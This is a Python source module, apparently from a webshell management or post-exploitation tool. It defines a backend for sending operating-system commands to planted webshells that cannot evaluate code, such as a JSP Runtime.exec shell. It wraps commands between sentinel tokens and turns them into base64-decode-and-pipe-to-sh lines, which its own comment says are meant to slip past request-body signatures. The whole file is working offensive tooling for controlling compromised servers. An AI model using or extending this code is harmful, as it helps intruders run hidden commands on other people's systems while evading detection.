"""A language-agnostic *command* shell backend.

Models shells that can only run OS commands (no language ``eval``) — e.g. a JSP
``Runtime.exec`` webshell. The parameter value is a ``/bin/sh -c`` script, so
execution and sentinels are expressed in shell, and arbitrary-code execution
(``run_php``) is unavailable. Features that need eval are gated off by the empty
set of language capabilities; command-based features still work.
"""

from __future__ import annotations

from ...encoders import EncodedPayload
from .base import Backend, CommandBuilder


class CommandBackend(Backend):
    name = "command"
    capabilities = frozenset({"command"})
    supports_eval = False
    # A command shell can only decode what /bin/sh + coreutils can: base64.
    # (Pure-shell gzinflate/xor of arbitrary bytes is impractical, so those
    # transforms are reserved for eval backends.)
    supported_transforms = frozenset({"base64"})

    def literal(self, value: str) -> str:  # not used (no code-gen); raw passthrough
        return value

    def sentinel(self, token: str, code: str) -> str:
        # The shell command is wrapped so its output is bounded by the token.
        return f"echo {token}; {code}; echo {token}"

    def wrap_command(self, payload: EncodedPayload) -> str:
        if payload.name == "base64":
            # Decode the bounded shell script and execute it. base64/sh are
            # universally present, so this hides the command from naive
            # request-body signatures without assuming anything exotic.
            return f"echo {payload.b64}|base64 -d|sh"
        raise ValueError(f"command backend cannot decode transform {payload.name!r}")

    def command_builders(self) -> dict[str, CommandBuilder]:
        return {}

    def disabled_functions_code(self) -> str | None:
        return None

    def webroot_code(self) -> str | None:
        return None

    def version_code(self) -> str | None:
        return None
